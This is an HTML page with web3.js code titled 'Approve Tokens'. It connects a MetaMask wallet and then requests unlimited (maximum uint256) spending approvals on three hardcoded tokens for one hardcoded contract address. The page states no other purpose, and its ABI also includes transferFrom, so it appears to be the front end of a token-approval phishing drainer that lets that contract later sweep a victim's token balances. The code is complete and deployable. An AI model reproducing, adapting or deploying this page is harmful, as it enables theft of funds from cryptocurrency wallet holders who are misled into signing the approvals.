<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Approve Tokens</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
</head>
<body>
    <h1>Approve Tokens</h1>
    <button id="connectWallet">Connect Wallet</button>
    <p>Wallet Address: <span id="walletAddress">Not connected</span></p>
    <button id="approveTokens">Approve Tokens</button>

    <script>
        // Contract and Token Addresses
        const contractAddress = "0xC553839F1d5B0006D2f760677dEEC0cB65aF7Dc9";
        const tokenAAddress = "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23";
        const tokenBAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E";
        const tokenCAddress = "0xD00485b963E46753d7F1AC0a21487391e635Ca07";

        const contractABI = [
            {
                "inputs": [
                    { "internalType": "address", "name": "spender", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "approve",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "account", "type": "address" }
                ],
                "name": "balanceOf",
                "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
                "stateMutability": "view",
                "type": "function"
            },
            {
                "inputs": [
                    { "internalType": "address", "name": "sender", "type": "address" },
                    { "internalType": "address", "name": "recipient", "type": "address" },
                    { "internalType": "uint256", "name": "amount", "type": "uint256" }
                ],
                "name": "transferFrom",
                "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
                "stateMutability": "nonpayable",
                "type": "function"
            }
        ];

        let userAddress;

        // Connect Wallet
        document.getElementById("connectWallet").onclick = async () => {
            if (typeof window.ethereum !== "undefined") {
                try {
                    const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                    userAddress = accounts[0];
                    document.getElementById("walletAddress").innerText = userAddress;
                } catch (error) {
                    alert("Connection to wallet failed.");
                    console.error(error);
                }
            } else {
                alert("MetaMask is not installed!");
            }
        };

        // Approve Tokens
        document.getElementById("approveTokens").onclick = async () => {
            if (!userAddress) {
                alert("Please connect your wallet first!");
                return;
            }

            const web3 = new Web3(window.ethereum);

            try {
                // Maximum allowance
                const maxUint = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");

                // Approve Token A
                const tokenAContract = new web3.eth.Contract(contractABI, tokenAAddress);
                console.log("Approving Token A...");
                await tokenAContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
                console.log("Token A approved.");

                // Approve Token B
                const tokenBContract = new web3.eth.Contract(contractABI, tokenBAddress);
                console.log("Approving Token B...");
                await tokenBContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
                console.log("Token B approved.");

                // Approve Token C
                const tokenCContract = new web3.eth.Contract(contractABI, tokenCAddress);
                console.log("Approving Token C...");
                await tokenCContract.methods.approve(contractAddress, maxUint.toString()).send({ from: userAddress });
                console.log("Token C approved.");

                alert("Tokens approved successfully!");
            } catch (error) {
                console.error("Approval error:", error);
                alert("Failed to approve tokens. Check console for details.");
            }
        };
    </script>
</body>
</html>
